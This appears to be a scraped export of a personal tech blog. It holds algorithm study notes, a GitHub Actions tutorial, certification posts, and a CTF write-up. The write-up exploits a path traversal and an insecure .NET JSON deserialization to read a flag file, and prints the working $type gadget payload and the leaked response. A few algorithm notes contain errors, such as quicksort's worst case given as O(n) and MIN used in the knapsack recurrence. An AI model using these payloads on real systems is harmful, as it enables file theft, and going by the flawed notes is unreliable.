PPP and PPPOE theory and configuration are emphasised. WLAN not very emphasised. WLAN is very emphasised. Python Automation is not touched on. A bit of Python Automation. Conclusion Overall, I think this is an OK exam. However, would I have taken it if it wasn\u0026rsquo;t sponsored by my university? No. I think CCNA is better as it emphasised (a bit) more on practical skills and requires deeper knowledge.\nP.S. I love my prof in UM \u0026lt;3\n","date":"2025-10-17T04:52:25-04:00","permalink":"https://trinuro.github.io/p/hcia-datacom-certication/","title":"HCIA DataCom Certication"},{"content":"Merge Sort This algorithm is interesting as it has a worst and average case of O(nlogn) However, it is not in-place (Requires extra memory) It is stable too. (The relative position of two elements of the same value is the same before and after sorting.) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 MERGE-SORT(A,p,q) m = floor((p+q)/2) MERGE-SORT(A,p,m-1) MERGE-SORT(A,m,q) MERGE(A,p,q,m) MERGE(A,p,q,m) n1 = m-p n2 = q-m+1 Create an array, L[1..n1] Create an array, R[1..n2] L[1..n1] = A[p..m-1] R[1..n2] = A[m..q] j = 0 k = 0 for i in p to q if L[j] \u0026lt;= R[k] A[i] = L[j] j = j+1 else A[i] = R[k] k = k+1 Quick Sort Good all-purpose sorting algorithm In-place (Sorting is done without extra memory) Not stable It has an average case of O(nlogn) and a worst case of O(n) The algorithm 1 2 3 4 5 6 7 8 9 10 11 12 13 14 QUICK-SORT(A,p,q) m = PARTITION(A,p,q) QUICK-SORT(A,p,m-1) QUICK-SORT(A,m,q) PARTITION(A,p,q) u = A[q] // get the last element as pivot k = 0 for i in p to q-1 if A[i] \u0026lt; u // elements smaller than pivot will be to the left of pivot k = k+1 swap A[i] and A[k] Swap A[i] and A[k+1] // pivot will be between elements smaller than it and elements larger than it return k+1 // position of pivot In order to reduce the possibility of the worst case from happening, we should randomly choose the pivot. Counting sort The algo 1 2 3 4 5 6 7 8 9 10 11 counting-sort(A,B,k) let C[1..k] be a new list for i = 1 to k C[i] = 0 for j = 1 to A.length C[A[j]] = C[A[j]] + 1 for i = 1 to k C[i] = C[i]+C[i-1] for j = A.length downto 1 B[C[A[j]]] = A[j] C[A[j]] = C[A[j]] -1 Time complexity is O(n+k) It is very efficient if the range of elements is small and known Counting sort is stable. Radix Sort The algo 1 2 3 radix-sort(A,d) for i = 1 to d use a stable sort to sort array[A] on digit i Time complexity is O(n*k) where n is the number of elements and k is the number of radices. It is very efficient to sort integers with similar number of integers Bucket Sort 1 2 3 4 5 6 7 8 bucket-sort(A) n = A.length let B [0..n-1] be a new array for i = 0 to n-1 make B[i] an empty list for i = 1 to n insert A[i] into list B[|_n*A[i]_|] concatenate the lists B[0], B[1]...B[n-1] together in order Time complexity is theta(n)/O(n+k) where n is the number of elements and k is the number of buckets.\nShell Sort Algorithm 1 2 3 4 5 6 7 gaps = [x,y,z...] for each (G in gaps) create sub-arrays with elements having gap as G for each (S in sub-arrays) insertion_sort(s) merge all sub arrays gaps usually divides by 2 every iteration Does not have a fixed time complexity. Apparently, it is good for sorting with limited memory? ","date":"2025-07-15T23:59:30Z","permalink":"https://trinuro.github.io/p/writeups-on-sorting-algorithms/","title":"Writeups on Sorting Algorithms"},{"content":" Hash tables are interesting because they have an average time complexity of O(1) for most operations. In order words, for most cases, we can retrieve and insert data in the constant time. To insert data, we will convert the key into hash, then insert the key into the table. Table[hash(key)] = key Load factor is the ratio of the number of elements to number of slots in the table. The higher this ratio, the higher the probability of collision (Two elements have the same hash). Hash table operations (insert, retrieval) time complexity: Average case: O(1) Worst case: O(n) For hashing with chaining, O(1+alpha), where Alpha is the load factor Types of Hashes Modular hashes: H(k) = k mod q Multiplication hashes: H(k) = floor(q*(n*k mod 1)). Best way I can explain this is we multiply k by a fraction, n and gets the fraction (numbers after decimal point).. Then, we multiply it by a certain number and get a whole number. Cryptographic hashes: RSA etc Universal hashing: Create a set of hashes. Choose one to use randomly each time we need a hash. Hash collision Handling Methods Hash collisions refers to the situation where two data has the same hash. There are two ways to handle this Chaining: Each \u0026ldquo;slot\u0026rdquo; in the table is a linked list. Append the colliding elements to the linked list in table[hash] Open addressing: Find another spot in the table to insert the second element We can see some pros and cons immediately: Chaining: Pros: Handles collisions very well. Works even when number of elements is more than number of slots. Also should be used when we do not know how many keys will be inserted into the hash table Cons: More memory needed (Linked list needs to store the memory address of next node) Open addressing: Pros: Only one element per slot. More memory efficient. Probing In open addressing when collisions occur, we need to search for the next spot. This searching process is called probing. There are 3 probing methods available: Linear probe: Basically, add 1 to the original hash. For example, if the first hash is 7, next hash is 8, 9 etc Quadratic probe: Add c1*i+c2*i^2 to the original hash. For example, if the first hash is 4, next hash is 5, 8, 13 etc. (4+i^2) Double hashing: Formula is H(k) = h1(k)+i*h2(k) % m. We need a second auxiliary hash to calculate the next probe sequence. Double hashing is better than linear and quadratic probe because it provides a unique probe sequence for each colliding key. Just imagine, if 5 keys collide using linear/quadratic probing, the fifth key has to probe 5 times before reaching a place to put itself in However, there are two important criteria when using double hashing: Result of second hash cannot be zero. You will be forever stuck! Result of hash (H(k)) must be co-prime to the number of slots in the table Resizing hash table You might be wondering, chaining seems so much better. You may be right, if not for resizing hash table. Process of resizing hash table Double (more or less) the size of the hash table Recalculate the keys of each element in the table Insert the elements in the table You should resize the table when load factor is too high to maintain optimal performance. Personal Opinion The best hash table in my opinion is hash table with open addressing and double hashing. The hash used is universal hashing. Hash table resize occurs when load factor exceeds 0.7. Universal hashing means that we do not use the same hash every time. We create a collection of hashes and choose 1 to use randomly every time. Double hashing ensures two colliding keys have different probe sequence. ","date":"2025-07-15T23:57:16Z","permalink":"https://trinuro.github.io/p/writeup-on-hashing-algorithms/","title":"Writeup on Hashing Algorithms"},{"content":" Dynamic programming is programming paradigm that takes advantage of overlapping subprograms. It increases efficiency by answering the subproblems once and keeping the answers to overlapping subprograms. There are two approaches of dynamic programming Memoization: We store the answers of overlapping subprograms as we solve them. Tabulation: We calculates the answers of the overlapping subprograms first. There are a few problems that can be solved with DP: 0-1 Knapsack Problem Rod-cutting Problem Fibonacci Series Fibonacci Series This is a good problem to showcase the efficiency of dynamic programming To solve this series naively, we use this 1 2 3 4 FIB(n) if n\u0026lt;=1 return n return FIB(n-1)+FIB(n-2) Recursive tree of naive algorithm: ![[Pasted image 20250709205728.png]] As you can see many calculations are repeated. This is the so called \u0026ldquo;overlapping subproblem\u0026rdquo; For example, FIB(2) is repeated 3 times We can improve efficiency by storing the results of FIB(X) ![[Pasted image 20250709205942.png]] This method is called the memoization method in dynamic programming 1 2 3 4 5 6 7 8 9 10 11 12 13 FIB-MEMO(n) Create an array S[0..n] for i in 1 to n S[i] = -1 return FIB-AUX(n,S) FIB-AUX(n,S) if S[n] != -1: return S[n] // if S[n] is memorized if n\u0026lt;=1 return n S[n] = FIB-AUX(n-1,S) + FIB-AUX(n-2,S) // memorize the output of FIB(n) return S[n] The tabulation approach is slightly different. In this approach, we will precompute all the answers to subproblems 1 2 3 4 5 6 7 FIB(n) Create an array A[0..n] A[0] = 0 A[1] = 1 for i in 2 to n A[i] = A[i-1] + A[i-2] return A[n] Visualization\ni 0 1 2 3 4 5 6 \u0026hellip; n FIB(i) 0 1 1 2 3 5 8 ‚Ä¶. 7. The naive approach to Fibonacci numbers has a time complexity of O(2^n) while the dynamic programming approach to Fibonacci numbers has a time complexity of O(n) Rod-Cutting Problem In this problem, we want to maximise the profit from a given length of rod. This is because the length of the rod is not proportional to the profit of the rod. Example: Say we have a Profit array of P = [3,5,1,9], where the profit of 1 unit length of rod is P[1] = 3 and so on. The length of the rod right now is 4 units. What is the best way to chop and sell this rod? The trick to solve this is to recursively find the maximum profit for rod length 1,2,3 and 4. 1 2 3 4 5 6 M[4] = MAX( P[4]+M[0], // no cut P[3]+M[1], // 3 unit + best cut for 1 unit P[2]+M[2], // 2 unit + best cut for 2 unit P[1]+M[3] // 1 unit + best cut for 3 unit ) To find the best cut of length 3,\n1 2 3 4 5 M[3] = MAX( P[3]+M[0], // no cut P[2]+M[1], // 3 unit + best cut for 1 unit P[1]+M[2], // 2 unit + best cut for 2 unit ) And so on. 4. The tabulation algorithm (n is the length of rod while P is the profit for each length of rod)\n1 2 3 4 5 6 7 8 9 ROD(n,P) Create an array M[0..n] M[0] = 0 for i in 1 to n q = - INF for j in 1 to i q = MAX(q, P[j]+ M[i-j]) M[i] = q return M[n] The memoization algorithm 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ROD(n,P) Create an array M[0..n] for i in 0 to n M[i] = -INF ROD-AUX(n,P,M) ROD-AUX(i,P,M) if M[i] != -INF return M[i] if i == 0 M[i] = 0 return M[i] q = -INF for j in 1 to i q = MAX(q, P[j]+ROD-AUX(i-j,P,M)) M[i] = q return M[i] 0-1 Knapsack Problem In this problem, we have n indivisible objects. We can only choose m objects out of n into our knapsack. We can only carry a max weight, w. Each object has a certain profit, P[i]. How do we pick these objects such that our profit is maximized? The naive approach is to test all possibilities. An object can be either in or outside the knapsack. (0 or 1) Thus, there is 2^n ways to choose objects. Find the profit of all the permutations. Reject the permutation that cause the knapsack to become overweight. The dynamic programming approach will stop the search at the maximum weight and avoid recalculating what is the highest profit at a certain weight value. (Kinda bad explanation, lul) The DP algorithm (Tabulation approach) 1 2 3 4 5 6 7 8 9 10 11 12 KNAPSACK(P,W,max) n = W.length Create a 2d array, M[0..n][0..max] for i in 0 to max M[0][i] = 0 // nothing has a profit of zero for i in 1 to n for j in 0 to max if j \u0026gt;= W[i] M[i][j] = MIN(M[i-1][j], M[i-1][j-W[i]]+P[i]) // ok, basically check if the previous set of objects or previous set of objects and the profit of current object is higher else M[i][j] = M[i-1][j] return M[n][max] Example P = {1,2,5,6}\nW = {2,3,4,5}\nMax weight = 8 P W i 0 1 2 3 4 5 6 7 8 0 0 i = 0 0 0 0 0 0 0 0 0 0 1 2 i = 1 0 0 1 1 1 1 1 1 1 2 3 i = 2 0 0 1 ==2== 2 3 3 3 3 5 4 i = 3 0 0 1 ==2== 5 5 6 7 7 6 5 i = 4 0 0 1 ==2== 5 6 6 7 ==8== Max-profit = 8 To backtrack which object is in the set, Notice that M[3][8] is 7 != 8. Thus, Item 4 must be in this set. Subtract P[4] from 8. We get 8-6=2. Follow the column with value in 2 Notice that M[1][3] is 1 != 2. Thus, Item 2 must be in this set.\nSet of item with maximum profit = {2,4}\n","date":"2025-07-15T23:46:39Z","permalink":"https://trinuro.github.io/p/writeup-on-dynamic-programming-algorithms/","title":"Writeup on Dynamic Programming Algorithms"},{"content":" In graph theory, there are four major types of problems: Searching: We want to find a node, n in the tree Minimum spanning tree: We want to find a way to connect all nodes in the cheapest way possible. Single source shortest path: We want to find the shortest path from a source node, u to every other node, v in the graph. All pairs shortest path: We want to find the shortest path from all nodes to every other nodes in the graph Searching algorithms There are two important search algorithms: Depth-first search (DFS) Breadth-first search (BFS) General differences: DFS uses stack while BFS uses queue DFS results in a \u0026ldquo;taller\u0026rdquo; tree while BFS results in a tree with more branches DFS Pseudocode 1 2 3 4 5 6 7 8 9 10 11 12 13 DFS(G,s) V = {} DFS-AUX(G,s,V) DFS-AUX(G,u,V) if u is in V return process(u) // print it, add it to a sum etc V = V U {u} for each vertex v that is neighbour of u if v is not in V DFS-AUX(G,v,V) BFS Pseudocode 1 2 3 4 5 6 7 8 9 10 11 12 BFS(G,s) V = {s} Create queue Q ENQUEUE(Q,s) while Q is not empty u = DEQUEUE(Q) process(u) // print it, add it to a sum etc for each vertex v that is a neighbour of u if v is not in V V = V U {v} ENQUEUE(Q,v) Minimum spanning tree Minimum spanning tree: Connected and acyclic graph in which the total weight of edges is the smallest Two ways to create MST: Prim\u0026rsquo;s algorithm Choose vertex Maintain one MST during building process Kruskal\u0026rsquo;s algorithm Choose edge Maintain one or more MST during building process Prim\u0026rsquo;s Algorithm Pseudocode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PRIM(G,s) // initialise key and previous node for each vertex v in G.V: v.key = INF v.previous = NIL s.key=0 V = G.V while V is not empty: u = EXTRACT-MIN(V) // get node with lowest weight for each vertex v that is neighbour of u // adjust the key of all nodes if v is in V and v.key \u0026gt; w(u,v): v.key = w(u,v) v.previous = u Kruskal\u0026rsquo;s Algorithm Pseudocode 1 2 3 4 5 6 7 8 9 10 KRUSKAL(G) for each vertex v in G.V: MAKE-SET(v) // each vertex is its own tree Sort G.E in ascending order of weight // get edge with lowest weight each time S = {} for each edge (u,v) in G.E: if GET-SET(u) != GET-SET(v): // prevents merge of nodes from same tree UNION(u,v) // merge two trees S = S U {(u,v)} // add edge to output return S Both Prim and Kruskal have time complexity of O(ElogV) Single source shortest Path Objective is to find shortest path from current node, s to all other nodes Two algorithms are available: Dijkstra\u0026rsquo;s Cannot handle negative weights Better time complexity for positive weights than Bellman-Ford Bellman-Ford Can handle negative weights Both do not work if there exists a negative cycle Dijkstra\u0026rsquo;s algorithm pseudocode 1 2 3 4 5 6 7 DIJKSTRA(G,s,w) INITIALISE-SINGLE-SOURCE(G,s) V = G.V while V is not empty: u = EXTRACT-MIN(V) // Get the vertex with smallest weight every time for each vertex v that is neighbour of u: RELAX(u,v,w) Bellman-Ford algorithm Pseudocode 1 2 3 4 5 6 7 8 9 10 BELLMAN-FORD(G,s,w) INTIALISE-SINGLE-SOURCE(G,s) n = |G.V| for i in 1 to n-1 for each edge(u,v) in G.E RELAX(u,v,w) for each edge(u,v) in G.E if v.key \u0026gt; u.key+w(u,v) return FALSE // If negative cycle exist, the result is wrong return TRUE Helper algorithms 1 2 3 4 5 6 7 8 9 10 11 12 // Initialize all vertex to have nodes with impossible distance and no parent node, except source node INTIIALISE-SINGLE-SOURCE(G,s) for each vertex u in G.V u.key = INF u.previous = NIL s.key = 0 // Adjust the key of each node IF there is a better path to the node RELAX(u,v,w) if v.key \u0026gt; u.key+w(u,v) v.key = u.key+w(u,v) v.previous = u Time complexity of Dijkstra Without max-heap: O(V^2) With max-heap: O(ElogV) Time complexity of Bellman-Ford is O(VE) All Pairs Shortest Path Objective is for each pair of vertex, u and v, of the graph, find the shortest path between these two nodes Two algorithms: Johnson\u0026rsquo;s: Complex as heck, but better time complexity Floyd-Warshall Simple, uses matrices Johnson\u0026rsquo;s algorithm high level overview Add a new vertex to the graph and add edge to each existing vertex on the graph Apply Bellman-Ford algorithm and normalize the graph to remove all negative-weighted edges Remove the extra vertex in step 1 and apply Dijkstra\u0026rsquo;s on all original vertices. Floyd-Warshall algorithm pseudocode 1 2 3 4 5 6 7 8 9 10 FLOYD-WARSHALL(G,w) n = |G.V| Create a matrix nxn, D(0) D = G for i in 1 to n for j in 1 to n for k in 1 to n Create a new nxn matrix, D(i) D(i)[j][k] = MIN(D(i-1)[j][k], D(i-1)[j][i]+D(i-1)[i][k]) return D(n) Floyd-Warshall time complexity is O(V^3) Johnson\u0026rsquo;s algorithm time complexity is O(V^2 log V + VE) ","date":"2025-07-15T23:37:48Z","permalink":"https://trinuro.github.io/p/writeup-on-graph-algorithms/","title":"Writeup on Graph Algorithms"},{"content":"In this blog post, I would like to share a little about workflows on GitHub. In a nutshell, workflows allow you automate stuffs on GitHub, like continuous integration, continuous deployment, make bots that automatically comment on issues, make bots that automatically create pull requests from issues etc. This post contains a hands-on lab to follow along. You can view the completed code in this repository\nSet Up Fork the repository Clone the repository release v1. 1 2 3 4 5 6 7 8 git clone git@github.com:trinuro-organization/gha-ci-example-fork.git # change this cd .\\gha-ci-example-fork\\ # change this git remote add upstream https://github.com/trinuro/gha-ci-example git fetch --tags upstream git push --tags git checkout v1 git switch -c myBranch A quick test to see whether it works: 1 git branch Desired Output:\n1 2 main * myBranch Inside the repository, you will see 3 important files: example_module.py: Just a simple python module test_counting_sort.py and test_find_missing_number.py: Tests cases for said module Navigate to the the github repository\u0026gt; Actions tab and enable Actions. Workflows A workflow uses the YAML syntax A workflow must have the following \u0026ldquo;root\u0026rdquo; keys 1 2 3 4 on: # identifies the events that trigger this workflow jobs: # identifies the jobs to run Events that trigger workflows There are many events that can trigger workflows. A few common ones: push: When a commit is pushed to GitHub pull_request: When a pull request is created (Before it is merged) workflow_dispatch: Manual trigger (Gives you a button to trigger said workflow) repository_dispatch: Trigger due to events outside the repo (Very interesting, this one) To add an event trigger, add it under on 1 2 3 4 5 6 7 8 on: push # works for single event trigger on: [push, pull_request] # multiple events # more granular event trigger on: push: branches: [main] pull_request: branches: [main] In our example, let\u0026rsquo;s say we want to define 4 event triggers. 1 2 3 4 5 6 7 8 9 10 on: push: branches: [\u0026#39;main\u0026#39;] pull_request: # trigger when pr is created to main branch branches: [\u0026#39;main\u0026#39;] workflow_dispatch: # manual trigger repository_dispatch: # trigger via outside events jobs: # identifies the jobs to run Jobs We can define multiple jobs that run during a workflow Each job is run inside its own independent container. Each job can has multiple steps (that run in the same container) Compulsory options in a job are runs-on: Runs on a certain kind of container. There are 3 options on GitHub: Ubuntu-latest MacOS-latest Windows-latest steps: Define the steps in an action There are two \u0026ldquo;kinds\u0026rdquo; of steps. Different keyword is used for both of them. Steps that run GitHub Actions: uses Steps that run commands on the container: run Let\u0026rsquo;s define a job with one step: Greeting the user. 1 2 3 4 5 6 7 8 9 # snip jobs: test: # name of job (can be \u0026#34;job1\u0026#34; etc) runs-on: ubuntu-latest # use linux machine steps: - name: \u0026#34;Hello World\u0026#34; # not compulsory but aids in debugging # use run to execute commands in the container run: echo \u0026#34;Hello $GITHUB_ACTOR, happy learning!\u0026#34; Output: 7. That is cool, but let\u0026rsquo;s clone our repository in the container so that we can examine the code inside. For this, we will use a pre-made action: actions/checkout\n1 2 3 4 5 6 7 8 9 jobs: test: runs-on: ubuntu-latest steps: - name: \u0026#34;Hello World\u0026#34; run: echo \u0026#34;Hello $GITHUB_ACTOR, happy learning!\u0026#34; - name: \u0026#34;Import Repository\u0026#34; # \u0026#34;uses\u0026#34; keyword allows us to use a github action uses: actions/checkout@v4 Learnt the fact that the container does not contain the repo the hard way lol Next, we will execute the Python test code 1 2 3 4 5 6 7 8 9 10 11 jobs: test: runs-on: ubuntu-latest steps: - name: \u0026#34;Hello World\u0026#34; run: echo \u0026#34;Hello $GITHUB_ACTOR, happy learning!\u0026#34; - name: \u0026#34;Import Repository\u0026#34; uses: actions/checkout@v4 - name: \u0026#34;Run Unit Test\u0026#34; # we can run multiline commands like this run: python -m unittest Just for fun, this is how you run a multiline step 1 2 3 4 5 6 7 8 9 10 11 12 13 jobs: test: runs-on: ubuntu-latest steps: - name: \u0026#34;Hello World\u0026#34; run: echo \u0026#34;Hello $GITHUB_ACTOR, happy learning!\u0026#34; - name: \u0026#34;Import Repository\u0026#34; uses: actions/checkout@v4 - name: \u0026#34;Run Unit Test\u0026#34; # we can run multiline commands like this run: | ls -la python -m unittest Output: Other Workflow Triggers There are two unique workflow triggers that we defined, workflow dispatch and repository dispatch. Let\u0026rsquo;s see how to trigger them. To trigger workflow_dispatch, navigate to your GitHub Repo \u0026gt; Actions Tab \u0026gt; Click \u0026ldquo;Python Test\u0026rdquo; on the left sidebar. Click on \u0026ldquo;Run workflow\u0026rdquo; to trigger the workflow. To trigger repository_dispatch, you need to send a post request to a github endpoint. First, create a fine-tuned access token. Go to account settings\u0026gt; Developer Settings \u0026gt; PAT \u0026gt; Fine-grained tokens and press Generate New Token The fine-grained token must have the following permission set: \u0026ldquo;Contents\u0026rdquo; repository permissions (read and write) Send a HTTP request to the relevant endpoint. 1 2 3 4 5 6 7 curl -L \\ -X POST \\ -H \u0026#34;Accept: application/vnd.github+json\u0026#34; \\ -H \u0026#34;Authorization: Bearer github_pat_..\u0026lt;snip\u0026gt;..\u0026#34; \\ -H \u0026#34;X-GitHub-Api-Version: 2022-11-28\u0026#34; \\ https://api.github.com/repos/\u0026lt;accName\u0026gt;/\u0026lt;repo-name\u0026gt;/dispatches \\ -d \u0026#39;{\u0026#34;event_type\u0026#34;:\u0026#34;my_input\u0026#34;,\u0026#34;client_payload\u0026#34;:{}\u0026#39; Output: \u0026ldquo;Repository dispatch triggered\u0026rdquo; Conclusion This is a very simple example of a continuous integration workflow using GitHub. Automated workflows are quite powerful as it frees developers from mundane testing tasks and in terms of security, encourage a shift left in security. Further reading: GitHub Workflow Syntax: https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions ","date":"2025-07-12T23:21:25Z","permalink":"https://trinuro.github.io/p/github-actions-primer-workflows-for-continuous-integration/","title":"GitHub Actions Primer - Workflows for Continuous Integration"},{"content":"\nLast month, I completed 3 certifications from GitHub, namely Foundations, Actions and Advanced Security. It was not in my plan, but since I received 2 free vouchers and a 60% off voucher, I figured, why not lol. Let me give you a quick run down of what I learnt and some tips for the exam.\nWhat I learnt (The useful ones anyways) GitHub Foundations Codespaces: Codespaces is a container allocated for a repository. You can edit your repository code, push commits, run and test the code etc. It is very useful if you want to test your code on the go. It uses the VS code interface. Web Editor: It is basically codespaces but you can only run and edit files, no code execution. It does not incur charges from GitHub. I usually use this nowadays. Shortcut to use the editor: change https://github.com/trinuro/actions-learning-pathway to https://github.dev/trinuro/actions-learning-pathway .devcontainer/devcontainer.json: This file is used to configure the environment of codespaces. For example, install Golang in the container GitHub Actions Workflows: Workflow is the file to define automatic operations in a repository. You must define the events that trigger the workflow (eg a push commit) and the jobs that it will execute if said event is triggered. Use this for CI/CD. Custom GitHub Actions: You can define your own GitHub actions to be reused in multiple workflows. Just remember to define a actions.yml in the root directory. Reusable workflows: This is different from GitHub Actions in the sense that GH actions is used as a step in a job while reusable workflow is used as job GitHub Secret: Use this to store secrets for your workflows. Don\u0026rsquo;t hardcode it. GitHub Advanced Security: Code scanning: Identifies logical vulnerabilities in repository code, eg. SQL Injection Secret scanning: Identifies exposed secrets in repository code, issues, pull requests etc, eg API tokens Push protection: Identifies exposed secrets before it is committed Dependabot: Identifies vulnerable dependencies in the repo Dependabot Security Update: Automatically create pull request when vulnerable dependency is detected Tips for the exam Go through the exam syllabus. Make sure you can answer each point in the syllabus Do labs! Go through GitHub Learning Pathways for initial exposure Go through MS Learn on GitHub for labs Try out the practice tests on GHCertified. It is not one-to-one with the exam questions but I think it is good enough. It shows you which documentation to read which is good. Read them all. Final Thoughts Out of the three, I learnt/struggled the most from the GitHub Actions certification. However, I would definitely encourage the reader to go through the GitHub Actions cert before attempting GitHub Advanced Security (GHAS) as GHAS builds on the knowledge on GitHub Actions.\nGood luck and happy learning. Cert collector out.\n","date":"2025-07-05T23:43:29Z","permalink":"https://trinuro.github.io/p/got-my-first-github-certification/","title":"Got my first GitHub Certification!"},{"content":"Welcome to NoteSafe, the ultra-secure note-taking app that protected by \u0026ldquo;Bitcoin-style encryption\u0026rdquo;‚Ñ¢. Store your deepest thoughts and sensitive files behind a digital vault crafted by developers who read just enough of the Bitcoin whitepaper to feel dangerous.\nBut how safe is NoteSafe, really?\nCan you bypass the crypto-hype, dig through the interface, and uncover what they\u0026rsquo;ve desperately tried to hide? A flag waits for the one who can see through the buzzwords and break the illusion of security.\nWriteup There are many dotnet DLL files. We can use JetBrain\u0026rsquo;s dotPeek to disassemble them. There is an interesting code in NoteSafe.Services.DatabaseService 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 private async Task SeedDatabaseAsync() { try { if (!await this.CheckTableExistsAsync(\u0026#34;Users\u0026#34;)) LoggerExtensions.LogWarning((ILogger) this._logger, \u0026#34;Users table does not exist, cannot seed database.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); else if (await this._context.Users.CountAsync\u0026lt;User\u0026gt;() \u0026gt; 0) { LoggerExtensions.LogInformation((ILogger) this._logger, \u0026#34;Database already has users, skipping seed.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); } else { User adminUser = new User() { Username = \u0026#34;admin\u0026#34;, PasswordHash = \u0026#34;240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9\u0026#34;, CreatedAt = DateTime.UtcNow }; this._context.Users.Add(adminUser); int num1 = await this._context.SaveChangesAsync(); LoggerExtensions.LogInformation((ILogger) this._logger, \u0026#34;Added admin user to database.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); this._context.Notes.Add(new Note() { Title = \u0026#34;Secret Flag\u0026#34;, Content = \u0026#34;FLAG{this_flag_is_not_the_flag}\u0026#34;, CreatedAt = DateTime.UtcNow, UpdatedAt = DateTime.UtcNow, UserId = adminUser.Id }); int num2 = await this._context.SaveChangesAsync(); LoggerExtensions.LogInformation((ILogger) this._logger, \u0026#34;Added flag note to database.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); adminUser = (User) null; } } catch (Exception ex) { LoggerExtensions.LogError((ILogger) this._logger, ex, \u0026#34;Error seeding database.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); throw; } } The password is admin123 Let\u0026rsquo;s log in as admin:admin123 Alright we are in The flag does not work We can get directory listing like this: 1 GET /api/Files/list?folder=../../ HTTP/1.1 Note: It is most probably an insecure deserialisation problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public async Task\u0026lt;Note\u0026gt; CreateNoteAsync(string jsonPayload, int userId) { Note noteAsync; try { try { Note note = JsonConvert.DeserializeObject\u0026lt;Note\u0026gt;(jsonPayload); if (note != null) { note.UserId = userId; note.CreatedAt = DateTime.UtcNow; note.UpdatedAt = DateTime.UtcNow; this._context.Notes.Add(note); int num = await this._context.SaveChangesAsync(); noteAsync = note; goto label_15; } note = (Note) null; } catch { } object obj1 = JsonHelper.DeserializeObject\u0026lt;object\u0026gt;(jsonPayload); PropertyInfo[] properties = obj1.GetType().GetProperties(); Dictionary\u0026lt;string, object\u0026gt; dictionary = new Dictionary\u0026lt;string, object\u0026gt;(); foreach (PropertyInfo propertyInfo in properties) { try { object obj2 = propertyInfo.GetValue(obj1); // creating the object dictionary[((MemberInfo) propertyInfo).Name] = obj2; } catch { dictionary[((MemberInfo) propertyInfo).Name] = (object) \u0026#34;[Error reading property]\u0026#34;; } } throw new InvalidOperationException(\u0026#34;Invalid object type. Debug info: \u0026#34; + JsonConvert.SerializeObject((object) dictionary)); // we want to trigger this } catch (Exception ex) { throw; } label_15: return noteAsync; // we dont want this } Reason for the vulnerability: JsonHelper.DeserializeObject\u0026lt;object\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public static T DeserializeObject\u0026lt;T\u0026gt;(string json) { try { JsonSerializerSettings settings = new JsonSerializerSettings() { TypeNameHandling = TypeNameHandling.All, SerializationBinder = (ISerializationBinder) null, TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full, ConstructorHandling = ConstructorHandling.AllowNonPublicDefaultConstructor, PreserveReferencesHandling = PreserveReferencesHandling.Objects, MetadataPropertyHandling = MetadataPropertyHandling.ReadAhead }; return JsonConvert.DeserializeObject\u0026lt;T\u0026gt;(json, settings); } catch { throw; } } T can be only object, so we can deserialize any object we want. Our JSON payload: First, We identify our gadget: In this case, our gadget is FileSystemService object as it will read file and store it as an instance variable 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 public class FileSystemService { public string FilePath { get; set; } // we can set FilePath public FileSystemService() { } public FileSystemService(string filePath) =\u0026gt; this.FilePath = filePath; public string ReadFileAsString(string path = null) { string str = path ?? this.FilePath; if (string.IsNullOrEmpty(str)) return (string) null; try { return File.Exists(str) ? File.ReadAllText(str) : (string) null; } catch (Exception ex) { return (string) null; } } public string FileContents // file contents is leaked here { get =\u0026gt; this.ReadFileAsString(); set { } } \u0026lt;snip\u0026gt; } We need to get information about the assembly and type from dotPeek\n1 2 3 4 5 // Decompiled with JetBrains decompiler // Type: NoteSafe.Services.FileSystemService // Assembly: NoteSafe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null // MVID: 50FA2D5F-03F2-4E88-B45C-760E5B77FEB8 // Assembly location: C:\\Users\\Khiew\\Downloads\\NoteSafe\\NoteSafe\\FOR_PLAYER\\NoteSafe\\NoteSafe\\NoteSafe.dll To build our payload,\n1 {\u0026#34;$type\u0026#34;: \u0026#34;NoteSafe.Services.FileSystemService, NoteSafe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\u0026#34;,\u0026#34;FilePath\u0026#34;: \u0026#34;../../../flag.txt\u0026#34;} Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 400 Bad Request Content-Type: text/plain; charset=utf-8 Date: Fri, 27 Jun 2025 23:43:28 GMT Server: Kestrel Content-Length: 127 Invalid object type. Debug info: {\u0026#34;FilePath\u0026#34;:\u0026#34;../../flag-hLS1iTUpUV.txt\u0026#34;,\u0026#34;FileContents\u0026#34;:\u0026#34;flag{fake_flag}\u0026#34;} However, this will not work in remote. This is because the organizer changed the name of the flag file. To find the new name, list the directory with the endpoint previously 1 GET /api/Files/list?folder=../../ HTTP/1.1 Output:\n1 